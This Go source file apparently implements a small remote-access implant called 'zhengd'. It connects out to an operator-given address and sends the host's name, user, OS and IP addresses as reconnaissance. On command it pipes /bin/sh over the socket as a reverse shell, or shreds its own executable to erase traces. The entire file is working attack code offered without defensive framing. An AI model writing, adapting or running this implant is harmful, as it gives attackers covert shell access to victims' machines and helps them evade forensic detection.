package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type Recon struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Kernel   string `json:"kernel"`
	IP       string `json:"ip"`
	PublicIP string `json:"public_ip"`
}

func gatherRecon(conn net.Conn) Recon {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("LOGNAME")
	}
	return Recon{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Kernel:   runtime.GOOS,
		IP:       getLocalIP(),
		PublicIP: getPublicIP(conn),
	}
}

func getPublicIP(conn net.Conn) string {
	tcpAddr := conn.LocalAddr().(*net.TCPAddr)
	return tcpAddr.IP.String()
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}

func main() {
	connectAddr := flag.String("connect", "", "address to connect to (ip:port)")
	flag.Parse()

	if *connectAddr == "" {
		fmt.Fprintf(os.Stderr, "usage: zhengd -connect <ip:port>\n")
		os.Exit(1)
	}

	conn, err := net.Dial("tcp", *connectAddr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "connection failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Fprintf(os.Stderr, "connected to %s\n", *connectAddr)

	encoder := json.NewEncoder(conn)
	decoder := json.NewDecoder(conn)

	// Send recon
	if err := encoder.Encode(gatherRecon(conn)); err != nil {
		fmt.Fprintf(os.Stderr, "failed to send recon: %v\n", err)
		return
	}

	// Command loop
	for {
		var msg struct {
			Cmd string `json:"cmd"`
		}
		if err := decoder.Decode(&msg); err != nil {
			fmt.Fprintf(os.Stderr, "connection lost: %v\n", err)
			return
		}

		switch strings.TrimSpace(msg.Cmd) {
		case "shell":
			fmt.Fprintf(os.Stderr, "spawning shell...\n")
			cmd := exec.Command("/bin/sh")
			cmd.Stdin = conn
			cmd.Stdout = conn
			cmd.Stderr = conn

			encoder.Encode(map[string]string{"status": "shell_ready"})

			if err := cmd.Run(); err != nil {
				fmt.Fprintf(os.Stderr, "shell exited: %v\n", err)
			}

			encoder.Encode(map[string]string{"status": "shell_done"})

		case "exit":
			fmt.Fprintf(os.Stderr, "exiting...\n")
			return

		case "destroy":
			fmt.Fprintf(os.Stderr, "self-destructing...\n")
			encoder.Encode(map[string]string{"status": "destroying"})

			exePath, err := os.Executable()
			if err != nil {
				fmt.Fprintf(os.Stderr, "failed to get executable path: %v\n", err)
				encoder.Encode(map[string]string{"status": "destroy_fail", "error": err.Error()})
				return
			}
			exePath, _ = filepath.EvalSymlinks(exePath)

			// Try shred first
			if _, err := exec.LookPath("shred"); err == nil {
				fmt.Fprintf(os.Stderr, "shredding %s\n", exePath)
				shred := exec.Command("shred", "-zuvn", "3", exePath)
				shred.Run()
			} else {
				// Fallback to rm
				fmt.Fprintf(os.Stderr, "shred not found, removing %s\n", exePath)
				os.Remove(exePath)
			}

			encoder.Encode(map[string]string{"status": "destroyed"})
			fmt.Fprintf(os.Stderr, "goodbye\n")
			return

		default:
			fmt.Fprintf(os.Stderr, "unknown command: %s\n", msg.Cmd)
		}
	}
}
